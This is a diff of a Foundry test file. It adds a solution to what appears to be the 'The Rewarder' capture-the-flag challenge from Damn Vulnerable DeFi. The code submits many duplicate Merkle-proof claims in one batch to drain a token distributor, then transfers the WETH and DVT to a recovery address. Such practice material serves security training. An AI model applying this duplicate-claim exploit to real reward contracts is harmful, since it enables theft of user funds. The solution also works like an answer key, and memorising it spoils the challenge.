@@ -147,8 +147,60 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    
+
     function test_theRewarder() public checkSolvedByPlayer {
-        
+
+        // Load Merkle tree leaves for WETH and DVT rewards distribution
+        bytes32[] memory wethRewardLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory dvtRewardLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+
+        // Initialize token array for WETH and DVT claims
+        IERC20[] memory rewardTokens = new IERC20[](2);
+        rewardTokens[0] = IERC20(address(weth)); // First token is WETH
+        rewardTokens[1] = IERC20(address(dvt)); // Second token is DVT
+
+        // Attack Strategy: Claim WETH rewards first, then DVT rewards
+        // Calculate how many claims need to be repeated for WETH and DVT
+        // The denominator (1171088749244340) represents the claim amount associated with the player's address,
+        // which is retrieved from the WETH reward leaves data.
+        uint256 wethClaimIterations = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / 1171088749244340;    
+        // The denominator (11524763827831882) represents the claim amount associated with the player's address,
+        // which is retrieved from the DVT reward leaves data.
+        uint256 dvtClaimIterations = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / 11524763827831882;
+
+        // Prepare a combined claims array for WETH and DVT rewards
+        Claim[] memory rewardClaims = new Claim[](wethClaimIterations + dvtClaimIterations);
+
+        // Generate the WETH claims first
+        for (uint256 i = 0; i < wethClaimIterations + dvtClaimIterations; i++) {
+            if (i < wethClaimIterations) {
+                // Claim WETH rewards
+                rewardClaims[i] = Claim({
+                    batchNumber: 0, // First batch for WETH
+                    amount: 1171088749244340, // Claim amount for WETH
+                    tokenIndex: 0, // Index for WETH in `rewardTokens` array
+                    proof: merkle.getProof(wethRewardLeaves, 188) // player's address is at index 188
+                });
+            } else {
+                // Claim DVT rewards
+                rewardClaims[i] = Claim({
+                    batchNumber: 0, // First batch for DVT
+                    amount: 11524763827831882, // Claim amount for DVT
+                    tokenIndex: 1, // Index for DVT in `rewardTokens` array
+                    proof: merkle.getProof(dvtRewardLeaves, 188) // player's address is at index 188
+                });
+            }
+        }
+
+        // Submit all claims for both WETH and DVT rewards
+        distributor.claimRewards({inputClaims: rewardClaims, inputTokens: rewardTokens});
+
+        // Transfer WETH rewards to the recovery address
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        // Transfer DVT rewards to the recovery address
+        dvt.transfer(recovery, dvt.balanceOf(player));
     }
 
     /**
